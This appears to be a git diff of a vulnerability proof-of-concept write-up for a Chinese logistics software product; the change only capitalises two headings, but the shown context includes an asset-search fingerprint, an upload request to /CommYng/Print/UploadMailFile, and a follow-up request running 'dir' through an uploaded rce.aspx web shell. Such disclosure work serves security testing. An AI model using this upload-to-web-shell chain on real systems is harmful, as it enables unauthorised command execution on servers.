@@ -8,7 +8,7 @@
 app="东胜物流软件-物流软件"
 ```
 
-## poc
+## POC
 ```
 POST /CommYng/Print/UploadMailFile HTTP/1.1
 Host: [已模糊处理]
@@ -41,7 +41,7 @@ Response.End();
 -----WebKitFormBoundaryFfJZ4P1AZBixjELj--
 ```
 
-## poc
+## POC
 ```
 GET /UploadFiles/MailFile/20251128154558306rce.aspx?cmd=dir HTTP/1.1
 Host: [已模糊处理]
